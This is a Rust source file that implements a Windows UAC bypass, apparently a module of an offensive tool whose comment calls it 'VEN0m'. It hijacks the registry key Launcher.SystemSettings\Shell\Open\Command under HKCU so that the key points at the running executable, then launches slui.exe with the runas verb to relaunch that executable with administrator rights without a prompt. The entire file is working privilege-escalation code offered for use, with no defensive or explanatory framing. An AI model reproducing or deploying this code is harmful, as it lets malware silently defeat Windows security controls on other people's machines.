use anyhow::{Result, Context, bail};
use winreg::RegKey;
use winapi::um::winreg::{HKEY_CURRENT_USER};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::process;
use std::env;
use std::ptr::null_mut;
use winapi::um::winuser::SW_SHOW;
use winapi::um::shellapi::ShellExecuteW;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{OpenProcessToken, GetCurrentProcess};
use winapi::um::winnt::{TOKEN_QUERY, TokenElevation};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::ctypes::c_void;

pub fn bypass() -> Result<()> {

	let privs = is_elevated()?;
	if !privs {
    	println!("[+] Executing UAC Bypass");
		// Set the DelegateExecute registry key to an empty value
	    create_key(Some("DelegateExecute"), "")?;

	    let current_exe = match std::env::current_exe() {
	        Ok(exe) => exe.to_string_lossy().to_string(),
	        Err(e) => bail!("[!] Failed to get current executable path: {:?}", e),
	    };

	    // Set the command registry key to point to VEN0m
	    create_key(None, &current_exe)?;
        // Trigger the execution
	    run_as_admin("C:\\Windows\\System32\\slui.exe")?;
	 	process::exit(0);
 	}
 	else {
 		println!("[+] UAC Bypassed! Running with elevated privs!");

 	}
    Ok(())
}

fn create_key(key: Option<&str>, value: &str) -> Result<()> {
	
	let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = "Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command";

    // Create the reg key
    let (reg_key, _) = hkcu
        .create_subkey(path)
        .context("[!] Failed to create or open registry key")?;

    // Set the value
    match key {
        Some(k) => reg_key.set_value(k, &value)
            .context(format!("[!] Failed to set registry key: {}", k))?,
        None => reg_key.set_value("", &value)
            .context("[!] Failed to set default registry key")?,
    }

    Ok(())
}




pub fn run_as_admin(executable: &str) -> Result<()> {
    let executable_wide: Vec<u16> = OsStr::new(executable).encode_wide().chain(Some(0)).collect();

    // Use ShellExecuteW with the "runas" verb to trigger UAC
    let result = unsafe {
        ShellExecuteW(
            null_mut(),
            "runas\0".encode_utf16().collect::<Vec<u16>>().as_ptr(),
            executable_wide.as_ptr(),
            null_mut(),
            null_mut(),
            SW_SHOW,
        )
    };

    if result as usize <= 32 {
        bail!("[!] Failed to run as Administrator!");
    }

    Ok(())
}



fn is_elevated() -> Result<bool> {
    unsafe {
        let mut token = null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            bail!("[!] OpenProcessToken Failed!");
        }

        let mut elevation: u32 = 0;
        let mut size = std::mem::size_of::<u32>() as u32;
        if GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut c_void,
            size,
            &mut size,
        ) == 0
        {
            CloseHandle(token);
            bail!("[!] GetTokenInformation Failed!");
        }

        CloseHandle(token);
        Ok(elevation != 0)
    }
}
